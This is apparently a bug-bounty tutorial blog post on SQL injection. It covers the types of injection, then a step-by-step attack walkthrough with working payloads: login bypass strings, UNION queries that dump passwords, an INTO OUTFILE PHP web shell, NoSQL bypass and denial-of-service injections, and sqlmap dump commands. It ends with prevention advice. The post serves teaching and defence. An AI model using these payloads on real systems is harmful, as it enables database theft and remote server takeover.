# Bug Bounty Hunting: Web Vulnerability (SQL injection)
Author: Rosemary

SQL Injection (SQLi) is a critical web security vulnerability that allows attackers to manipulate SQL queries and gain unauthorized access to databases. This attack can lead to data breaches, unauthorized data modification, and even server compromise. In this blog, I will cover SQL Injection, its various forms, attack techniques, and strategies to prevent such exploits.

![1](https://www.indusface.com/wp-content/uploads/2024/04/sub-internal-How-does-SQL-Injection-Work-1.png)

### How SQL Queries Work: SQL queries follow a specific lifecycle when executed on a database:

    Parsing — The SQL server interprets the query syntax.
    Compilation — The query is translated into an executable format.
    Optimization — The server determines the way to execute the query.
    Execution — The query runs and retrieves data.

If user input is concatenated into the query before compilation, the database may interpret it as executable code rather than data. This is where SQL Injection becomes a serious threat.

---

### Types of SQL Injection

1. In-band SQL Injection: The most common type, where attackers use the same communication channel for injection and data retrieval.

    Error-Based: Manipulates queries to generate error messages revealing database details.Example: SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))
    Union-Based: Uses the UNION operator to merge results from different tables.Example: SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin

2. Inferential (Blind) SQL Injection: Exploits vulnerabilities by analyzing responses rather than retrieving direct data.

    Boolean-Based: Uses conditions to infer data by observing page behavior.Example: SELECT * FROM users WHERE id = 1 AND 1=1 (true) vs. AND 1=2 (false)
    Time-Based: Forces the database to delay responses to infer true/false conditions.Example: SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--

3. Out-of-band SQL Injection: Used when in-band methods fail, relying on external server requests (e.g., HTTP, DNS) to exfiltrate data.

---

### Each technique has trade-offs:

    In-band: Easy to exploit but noisy.
    Blind: Harder to detect but effective when error messages are hidden.
    Out-of-band: Less common but powerful when external communication is possible.

---

### SQL Injection Attack Techniques:

Step 1: Identify SQL Injection Vulnerability

Attackers start by identifying input fields vulnerable to SQL Injection. Common test payloads include:

' OR 1=1 --
" OR "1"="1"
admin' --

These payloads attempt to bypass authentication by altering the WHERE clause to always return true.
Step 2: Exploit the SQL Injection

Once a vulnerability is confirmed, attackers use SQL injection to extract database information. Example queries:

UNION SELECT null, @@version --
UNION SELECT username, password FROM users --

This technique allows an attacker to retrieve sensitive information such as usernames and passwords.
Step 3: Exfiltrate Information Using SQL Injections

In some cases, the attacker may need to store the extracted information on the server for retrieval. This can be done using the SELECT...INTO OUTFILE command in MySQL:

SELECT Password FROM Users WHERE Username='admin' INTO OUTFILE '/var/www/html/output.txt';

The attacker can then access the file via a web request:

https://example.com/output.txt

Step 4: Look for NoSQL Injections

NoSQL databases such as MongoDB are also vulnerable to injection attacks. For example, if an application constructs queries unsafely:

Users.find({username: $username, password: $password});

An attacker can bypass authentication by supplying:

{ "username": "admin", "password": { "$ne": "" } }

This query matches any non-empty password, granting unauthorized access.

Additionally, attackers can execute arbitrary JavaScript code by injecting into MongoDB’s $where operator:

Users.find({ $where: function() { return this.username == 'admin'; while(true){}; } });

This creates an infinite loop, causing a Denial of Service (DoS) attack.
Escalating the Attack

---

### Beyond extracting information, attackers may attempt to escalate their access:

    Determine Database Type & Version: SELECT 1, @@version;
    Extract Table and Column Names: UNION SELECT 1, table_name FROM information_schema.tables; UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'Users';
    Gain a Web Shell: An attacker may upload a web shell using SQLi:
    SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'; This allows them to execute commands remotely:http://example.com/shell.php?cmd=whoami
    Automating SQL Injection Attacks: Manually testing for SQLi is tedious, so attackers use tools like sqlmap to automate discovery and exploitation:

sqlmap -u "http://example.com/index.php?id=1" --dbs
sqlmap -u "http://example.com/index.php?id=1" --dump-all

---

### Other tools include:

    NoSQLMap (for NoSQL injections)
    Burp Suite (for manual and automated security testing)

---

### Preventing SQL Injection

    Parameterized queries separate SQL logic from user input, preventing injection:$stmt = $mysqli->prepare("SELECT Id FROM Users WHERE Username=? AND Password=?"); $stmt->bind_param("ss", $username, $password); $stmt->execute();
    Restrict user input to predefined values:
    $allowed_columns = ["Date", "Sender", "Title"]; if (!in_array($_GET['column'], $allowed_columns)) die("Invalid column");
    Escape special characters but always use with prepared statements:$username = mysqli_real_escape_string($conn, $_POST['username']);
    WAFs detect and block SQL Injection attempts.
    Limit database account permissions — avoid using root/admin.
    Conduct penetration testing, code reviews, and use tools like SQLmap.

---

### Conclusion

SQL Injection remains one of the most dangerous vulnerabilities in web applications. Attackers can exploit poorly constructed SQL queries to extract sensitive information, manipulate data, or even gain full control of a system. However, by implementing prepared statements, input validation, and other best practices, developers can effectively mitigate SQL Injection risks and build more secure applications.